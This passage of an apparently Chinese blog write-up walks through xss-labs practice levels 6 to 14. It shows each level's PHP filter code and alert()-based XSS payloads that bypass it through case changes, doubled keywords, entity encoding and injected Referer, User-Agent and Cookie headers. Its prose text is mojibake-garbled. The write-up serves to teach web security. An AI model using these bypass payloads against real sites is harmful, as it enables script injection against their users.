&lt;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958768.png"></p><p>ä¹‹åç‚¹å‡»<code>xxx</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958450.png"></p><h4 id="level6-å¤§å†™ç»•è¿‡"><a href="#level6-å¤§å†™ç»•è¿‡" class="headerlink" title="level6_å¤§å†™ç»•è¿‡"></a>level6_å¤§å†™ç»•è¿‡</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958703.png"></p><p>æ£€æŸ¥æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//ç»•è¿‡jsæ ‡ç­¾</span><br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-comment">//ç»•è¿‡onfocusäº‹ä»¶</span><br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<span class="hljs-comment">//ç»•è¿‡a hrefæ ‡ç­¾</span><br></code></pre></td></tr></table></figure><p>æ²¡æœ‰æ·»åŠ å°å†™è½¬åŒ–å‡½æ•° ï¼Œæˆ‘ä»¬ä½¿ç”¨å¤§å†™ç»•è¿‡ï¼š</p><p>æ„å»ºpayloadï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">sCript</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">sCript</span>&gt;</span> &lt;&quot;<br><br>&quot; Onfocus=javascript:alert() &quot;<br><br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hRef</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br></code></pre></td></tr></table></figure><p>ä¸‰ç§éƒ½å¯ä»¥é€šå…³</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958610.png"></p><h4 id="level7-åŒå†™ç»•è¿‡"><a href="#level7-åŒå†™ç»•è¿‡" class="headerlink" title="level7_åŒå†™ç»•è¿‡"></a>level7_åŒå†™ç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<span class="hljs-comment">//å¤§å†™è½¬å°å†™</span><br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<span class="hljs-comment">//è¿‡æ»¤jsæ ‡ç­¾</span><br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<span class="hljs-comment">//è¿‡æ»¤onfocusæ ‡ç­¾</span><br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<span class="hljs-comment">//è¿‡æ»¤a hrefæ ‡ç­¾</span><br></code></pre></td></tr></table></figure><p>å‡ºç°äº†ä¿©ä¸ªæ²¡è§è¿‡ä¸œè¥¿ï¼š</p><p><a href="https://www.w3school.com.cn/tags/index.asp">HTML æ ‡ç­¾å‚è€ƒæ‰‹å†Œ</a></p><p><code>src(source)</code>:<a href="https://www.w3school.com.cn/tags/tag_source.asp">HTML  æ ‡ç­¾_source</a></p><p>æ ‡ç­¾ç”¨äºä¸ºåª’ä½“å…ƒç´ ï¼ˆè§†é¢‘&#x2F;éŸ³é¢‘&#x2F;å›¾åƒï¼‰æŒ‡å®šå¤šä¸ªåª’ä½“èµ„æºã€‚</p><p><code>data</code>:ï¼ˆlevel6ä¹Ÿæœ‰ï¼‰<a href="https://www.w3school.com.cn/tags/tag_data.asp">HTML  æ ‡ç­¾_data</a></p><p>æ ‡ç­¾ç”¨äºæ·»åŠ ç»™å®šå†…å®¹çš„æœºå™¨å¯è¯»ç¿»è¯‘ã€‚</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨åŒæ‹¼å†™æ¥ç»•è¿‡ï¼Œ</p><p>æ¯”å¦‚onï¼Œæˆ‘ä»¬å¯ä»¥å†™æˆoonnï¼Œå½“ä¸­é—´onè¢«åˆ æ‰çš„æ—¶å€™ï¼Œå°±å˜æˆäº†on</p><p>æ¯”å¦‚scriptï¼Œå¯ä»¥å†™æˆscscriptiptï¼Œå½“scriptè¢«åˆ æ‰çš„æ—¶å€™ï¼Œå°±å˜æˆäº†script</p><p>æ‰€ä»¥è¿™å…³ä¸»è¦æ˜¯åŒæ‹¼å†™ç»•è¿‡ï¼Œæ–¹æ³•æœ‰å¾ˆå¤šï¼Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html">&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hrehreff</span>=<span class="hljs-string">javasscriptcript:alert()</span>&gt;</span>x<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span> &lt;&quot;<br>    <br>&quot;&gt; <span class="hljs-tag">&lt;<span class="hljs-name">scscriptript</span>&gt;</span>alert()<span class="hljs-tag">&lt;/<span class="hljs-name">scscriptript</span>&gt;</span> &lt;&quot;<br><br>&quot;oonnfocus=javascript:alert() &quot;     <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958793.png"></p><h4 id="level8-Unicodeè§£ç "><a href="#level8-Unicodeè§£ç " class="headerlink" title="level8_Unicodeè§£ç "></a>level8_Unicodeè§£ç </h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958226.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤æ‰äº†onfocusã€srcã€dataã€hrefã€scriptã€â€</p><p>è¿™ä¸€å…³åˆ©ç”¨hrefçš„éšè—å±æ€§è‡ªåŠ¨Unicodeè§£ç ï¼Œæˆ‘ä»¬å¯ä»¥æ’å…¥ä¸€æ®µjsä¼ªåè®®</p><p>åœ¨çº¿Unicodeç¼–ç ï¼š<a href="https://www.matools.com/code-convert-unicode">åœ¨çº¿Unicodeç¼–ç è§£ç  - ç å·¥å…·</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958663.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958995.png"></p><h4 id="level9-Unicodeè§£ç "><a href="#level9-Unicodeè§£ç " class="headerlink" title="level9_Unicodeè§£ç "></a>level9_Unicodeè§£ç </h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021958229.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä½¿ç”¨<code>strpos($str7, &#39;http://&#39;)</code>æ£€æŸ¥<code>$str7</code>ä¸­æ˜¯å¦åŒ…å«å­å­—ç¬¦ä¸²<code>http://</code>ã€‚</p><ul><li><code>strpos()</code>è¿”å›<code>http://</code>é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆæ•´æ•°ï¼‰ï¼Œè‹¥æœªæ‰¾åˆ°åˆ™è¿”å›<code>false</code>ã€‚</li><li>ç”±äºä½¿ç”¨ä¸¥æ ¼ç›¸ç­‰<code>===</code>æ¯”è¾ƒè¿”å›å€¼æ˜¯å¦ä¸º<code>false</code>ï¼Œåªæœ‰å®Œå…¨æœªæ‰¾åˆ°<code>http://</code>æ—¶æ¡ä»¶æˆç«‹ã€‚</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åœ¨ä¸Šä¸€å…³çš„åŸºç¡€ä¸ŠåŠ ä¸Š<code>http://</code>ï¼Œå¹¶ä¸”è¿˜éœ€è¦åŠ æ³¨é‡Šç¬¦å°†<code>http://</code>æ³¨é‡Šæ‰ã€‚</p><p>æ„å»ºpayloadï¼š<code>&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;/*http://*/</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959191.png"></p><h4 id="level10-onfocus"><a href="#level10-onfocus" class="headerlink" title="level10_onfocus"></a>level10_onfocus</h4><p>æ¥åˆ°ç¬¬åå…³å‘ç°æ²¡æœ‰è¾“å…¥æ¡†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959790.png"></p><p>åˆ†ææºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<span class="hljs-comment">//ä½¿ç”¨GETä¼ å‚&quot;t_sort&quot;</span><br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<span class="hljs-comment">//è¿‡æ»¤æ‰äº†&lt;&gt;å·</span><br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<span class="hljs-comment">//è¿‡æ»¤æ‰äº†&lt;&gt;å·</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ„å»ºpayloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?t_sort=&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p><code>type=&quot;text</code>è¦†ç›–åŸè¾“å…¥çš„<code>type</code>å±æ€§ã€‚åŸæœ¬æ˜¯<code>type=&quot;hidden&quot;</code>ï¼ˆéšè—è¾“å…¥æ¡†ï¼‰ï¼Œæ³¨å…¥åæ”¹ä¸º<code>type=&quot;text&quot;</code>ï¼Œä½¿è¾“å…¥æ¡†å¯è§ã€‚</p><p>æµè§ˆå™¨è§£æHTMLæ—¶ï¼Œè‹¥åŒä¸€å±æ€§é‡å¤ï¼Œé€šå¸¸ä»¥æœ€åä¸€ä¸ªä¸ºå‡†ã€‚å› æ­¤æ³¨å…¥çš„<code>type=&quot;text&quot;</code>å¯èƒ½è¦†ç›–åŸéšè—å±æ€§ï¼Œå¼ºåˆ¶æ˜¾ç¤ºè¾“å…¥æ¡†ä»¥ä¾¿ç”¨æˆ·äº¤äº’</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959543.png"></p><p>ä¹‹åç‚¹å‡»è¾“å…¥æ¡†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959333.png"></p><h4 id="level11-referer"><a href="#level11-referer" class="headerlink" title="level11_referer"></a>level11_referer</h4><p>æµ‹è¯•ä¸€ä¸‹å…³é”®å­—</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; sRc DaTa OnFocus <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span></span></span><br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php <br>ini_set(&quot;display_errors&quot;, 0);<br>$str = $_GET[&quot;keyword&quot;];<br>$str00 = $_GET[&quot;t_sort&quot;];<br>$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];//å°†HTTPè¯·æ±‚å¤´ä¸­çš„Refererä¿¡æ¯èµ‹å€¼ç»™å˜é‡$str11<br>$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);<br>$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);<br>echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;<br>&lt;/form&gt;<br><br>&lt;/center&gt;&#x27;;<br>?&gt;<br></code></pre></td></tr></table></figure><p>REFERERï¼ˆRefererï¼‰æ˜¯ <strong>HTTP è¯·æ±‚å¤´</strong> ä¸­çš„ä¸€ä¸ªå­—æ®µï¼Œç”¨äºè¡¨ç¤ºå½“å‰è¯·æ±‚çš„ <strong>æ¥æºé¡µé¢ URL</strong>ã€‚å®ƒæ˜¯æµè§ˆå™¨åœ¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚æ—¶è‡ªåŠ¨é™„åŠ çš„ä¿¡æ¯ï¼Œå‘Šè¯‰æœåŠ¡å™¨ç”¨æˆ·æ˜¯ä»å“ªä¸ªé¡µé¢è·³è½¬è¿‡æ¥çš„ã€‚</p><p>å…ˆå°è¯•ä¸€ä¸‹ç¬¬10å…³çš„<code>?t_sort=&quot; onfocus=javascript:alert() type=&quot;text</code></p><p>å‘ç°åŒå¼•å·è¢«å®ä½“åŒ–</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959136.png"></p><p>è¯•ä¸€ä¸‹referer</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959411.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959920.png"></p><p>å°†refereræ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959669.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959090.png"></p><h4 id="level12-User-Agentå¤´"><a href="#level12-User-Agentå¤´" class="headerlink" title="level12_User-Agentå¤´"></a>level12_User-Agentå¤´</h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959376.png">éšè—çš„inputæ ‡ç­¾å¯ä»¥æ’å…¥type&#x3D;â€textâ€æ˜¾ç¤º ï¼Œå¯ä»¥ä¸€ä¸ªä¸€ä¸ªå°è¯•ï¼š</p><p>æµ‹è¯•ä¸€ä¸‹å…³é”®å­—</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; sRc DaTa OnFocus <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span></span></span><br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ã€äºŒä¼ å‚æ²¡æœ‰å›æ˜¾</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021959975.png"></p><p>ç¬¬ä¸‰ä¸ªï¼šå¯ä»¥çœ‹åˆ°è¢«å®ä½“åŒ–</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000685.png"></p><p>åªèƒ½æ˜¯ç¬¬å››ä¸ªï¼š</p><p>uaæ˜¯User-Agentå¤´ï¼Œä½¿ç”¨bpæŠ“åŒ…æ”¹uaå¤´å°±å¯ä»¥äº†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000373.png"></p><p>æ„é€ UAå¤´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&quot; onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨bpæŠ“åŒ…</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000772.png"></p><p>å°†UAå¤´ä¿®æ”¹</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000841.png"></p><p>æ”¾è¡Œåç‚¹å‡»æ¡†</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022000572.png"></p><h4 id="level13-cookieå¤´"><a href="#level13-cookieå¤´" class="headerlink" title="level13_cookieå¤´"></a>level13_cookieå¤´</h4><p>ä¾æ—§å°è¯•å‰ä¸‰ä¸ªä¸æˆåŠŸ</p><p>æµ‹è¯•å…³é”®å­—</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&quot; sRc DaTa OnFocus <span class="hljs-tag">&lt;<span class="hljs-name">sCriPt</span>&gt;</span><span class="language-handlebars"><span class="language-xml"> <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">hReF</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span> <span class="hljs-symbol">&amp;#106;</span></span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001394.png"></p><p>åå­—æ˜¯t_cookï¼Œè€ƒè™‘åˆ°æ˜¯cookieå¤´ï¼Œæˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªç½‘é¡µçš„cookie</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001153.png"></p><p>å°†è¿™é‡Œä¿®æ”¹ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">â€œ onfocus=javascript:alert() type=&quot;text<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001360.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001920.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022001445.png"></p><h4 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h4><p><a href="https://www.freebuf.com/articles/web/282983.html">xss-labsé¶åœº-ç¬¬åå››å…³ iframeå’Œexif xssæ¼æ´ - 